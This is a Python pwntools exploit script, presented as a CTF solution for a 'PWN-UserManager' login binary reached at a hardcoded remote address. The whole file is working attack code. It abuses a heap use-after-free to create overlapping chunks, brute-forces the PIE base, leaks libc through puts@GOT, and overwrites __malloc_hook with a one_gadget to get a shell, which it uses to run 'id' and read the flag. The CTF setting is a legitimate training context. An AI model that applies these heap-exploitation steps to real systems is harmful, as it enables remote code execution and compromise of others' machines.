#!/usr/bin/env python3
"""PWN-UserManager CTF Solution - Optimized"""
import socket, time
from pwn import *
context.arch = 'amd64'
context.log_level = 'info'
elf = ELF('./login')
libc = ELF('./libc-2.23.so')
HOST, PORT = '120.27.146.76', 21125

class R:
    def __init__(self):
        for _ in range(10):
            try:
                self.s = socket.socket(); self.s.settimeout(15)
                self.s.connect((HOST, PORT)); time.sleep(0.5)
                self.b = self.s.recv(4096)
                if self.b and b'Menu' in self.b:
                    return  # Success!
                self.s.close()
            except: pass
            time.sleep(1)
        raise Exception("Failed to connect after 10 attempts")
    def ru(self, d, to=10):
        end = time.time() + to
        while d not in self.b:
            self.s.settimeout(max(end - time.time(), 0.1))
            x = self.s.recv(4096)
            if not x: raise EOFError()
            self.b += x
        i = self.b.find(d) + len(d); r = self.b[:i]; self.b = self.b[i:]; return r
    def rl(self, to=10): return self.ru(b'\n', to)[:-1]
    def sn(self, d): self.s.sendall(d)
    def sl(self, d): self.sn(d + b'\n')
    def close(self): self.s.close()
    def drain(self, to=1):
        self.s.settimeout(to)
        try:
            while True:
                x = self.s.recv(4096)
                if not x: break
                self.b += x
        except socket.timeout: pass

def menu(r): r.ru(b'Your choice:')
def reg(r, i, l, p):
    menu(r); r.sl(b'2')
    r.ru(b'Input the user id:'); r.sl(str(i).encode())
    r.ru(b'Input the password length:'); r.sl(str(l).encode())
    r.ru(b'Input password:'); r.sn(p)
def delete(r, i):
    menu(r); r.sl(b'3')
    r.ru(b'Input the user id:'); r.sl(str(i).encode())
def edit(r, i, p):
    menu(r); r.sl(b'4')
    r.ru(b'Input the user id:'); r.sl(str(i).encode())
    r.ru(b'Input new pass:'); r.sn(p)
def login(r, i, l, p):
    menu(r); r.sl(b'1')
    r.ru(b'Input the user id:'); r.sl(str(i).encode())
    r.ru(b'Input the passwords length:'); r.sl(str(l).encode())
    r.ru(b'Input the password:'); r.sn(p)

def try_pie(r, show_addr):
    """Try a specific show address via Login(2). Returns True if success."""
    sb = p64(show_addr)
    pw = b'\x01' * 8 + sb[:5]  # 13 bytes: 8 our pw + 5 show addr bytes
    menu(r); r.sl(b'1')  # Login
    r.ru(b'Input the user id:'); r.sl(b'2')
    r.ru(b'Input the passwords length:'); r.sl(b'13')
    r.ru(b'Input the password:'); r.sn(pw)
    r.drain(0.3)
    return b'success' in r.b

def exploit():
    r = R()
    log.info("Connected! Setting up heap...")
    reg(r, 0, 0x18, b'A'*0x18)
    reg(r, 1, 0x18, b'B'*0x18)
    delete(r, 0)  # UAF: A->B->0
    reg(r, 2, 8, b'\x01'*8)  # Overlap
    log.info("Setup done. A[0:8]=pw, A[8:16]=show(preserved)")

    # Fast PIE brute-force: show = PIE_base + 0x9D0
    # Common PIE patterns on 64-bit Linux:
    # Without ASLR: 0x555555554000
    # With 8-bit ASLR: 0x555555XX_X000 (XX varies)
    # With 12-bit ASLR: 0x5555XXXX_X000 (more bits vary)

    log.info("Trying common PIE bases...")
    pie_base = None

    # Try exact common bases first
    common_bases = [
        0x555555554000, 0x555555555000, 0x555555556000,
        0x560000000000, 0x555555550000, 0x555500000000,
        0x555555554000, 0x555555553000, 0x555555552000,
    ]
    for b in common_bases:
        show_a = b + 0x9D0
        if try_pie(r, show_a):
            pie_base = b
            log.success(f"PIE base found: {hex(pie_base)}")
            break

    # If not found, rapid-fire 8-bit brute-force
    if pie_base is None:
        log.info("8-bit entropy brute-force...")
        for x in range(256):
            b = 0x555555550000 + (x << 12)
            if try_pie(r, b + 0x9D0):
                pie_base = b
                log.success(f"PIE base: {hex(pie_base)} (x={hex(x)})")
                break
            if x % 32 == 0:
                log.info(f"Progress: {x}/256")

    if pie_base is None:
        log.error("PIE not found!")
        r.close()
        return

    # Clean up buffer
    r.b = b''

    # Libc leak via puts@GOT
    puts_got = pie_base + elf.got['puts']
    log.info(f"puts@GOT: {hex(puts_got)}")
    edit(r, 2, p64(puts_got)[:8])

    n = p64(puts_got).find(b'\x00')
    if n < 0: n = 8
    login(r, 2, n, p64(puts_got)[:n])
    r.ru(b'Login success!\n')
    libc_leak = r.rl(to=5)
    libc_puts = u64(libc_leak.ljust(8, b'\x00'))
    libc_base = libc_puts - libc.symbols['puts']
    log.success(f"Libc base: {hex(libc_base)}")

    # Overwrite __malloc_hook
    malloc_hook = libc_base + libc.symbols['__malloc_hook']
    one_gadget = libc_base + 0x4527a
    log.info(f"Overwriting __malloc_hook at {hex(malloc_hook)}")

    edit(r, 2, p64(malloc_hook)[:8])
    edit(r, 0, p64(one_gadget) + p64(0) * 2)

    # Trigger
    log.info("Triggering shell...")
    menu(r); r.sl(b'2')
    r.ru(b'Input the user id:'); r.sl(b'6')

    log.success("Shell!")
    time.sleep(0.5)
    r.sl(b'id')
    time.sleep(0.5)
    r.drain(2)
    print(r.b.decode(errors='ignore'))
    r.b = b''
    r.sl(b'cat /flag 2>/dev/null || cat flag 2>/dev/null')
    time.sleep(0.5)
    r.drain(2)
    print(r.b.decode(errors='ignore'))
    r.close()

if __name__ == '__main__':
    exploit()
